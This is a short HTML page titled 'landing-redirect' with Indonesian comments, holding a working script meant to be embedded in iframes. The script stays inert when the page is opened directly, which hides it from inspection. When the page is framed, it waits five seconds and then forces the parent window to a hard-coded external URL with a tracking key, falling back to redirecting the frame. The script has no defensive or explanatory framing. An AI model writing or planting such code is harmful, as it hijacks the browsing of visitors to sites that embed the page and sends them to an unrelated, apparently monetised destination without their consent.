<h1>landing-redirect</h1>

<script>
(function () {

  // Jangan redirect kalau dibuka langsung
  if (window.self === window.top) return;

  // Delay aman untuk iframe traffic
  setTimeout(function () {
    try {
      window.top.location.replace("https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970");
    } catch (e) {
      window.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
    }
  }, 5000);

})();
</script>
